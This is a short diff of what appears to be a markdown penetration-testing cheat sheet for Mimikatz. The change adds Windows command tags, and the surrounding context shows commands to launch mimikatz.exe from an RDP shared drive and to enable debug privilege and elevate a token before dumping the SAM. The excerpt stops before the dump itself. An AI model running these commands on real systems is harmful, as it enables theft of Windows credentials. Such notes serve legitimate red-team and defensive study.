@@ -6,6 +6,7 @@ Windows credential extraction tool used after administrator-level access to dump
 
 ### Launch from an RDP shared drive
 
+<!-- cmd: windows -->
 ```cmd
 \\tsclient\share\mimikatz\x64\mimikatz.exe
 ```
@@ -16,6 +17,7 @@ launched from a shared RDP drive to avoid a separate upload step.
 
 ### Enable debug, elevate token, and dump SAM
 
+<!-- cmd: windows -->
 ```cmd
 privilege::debug
 token::elevate
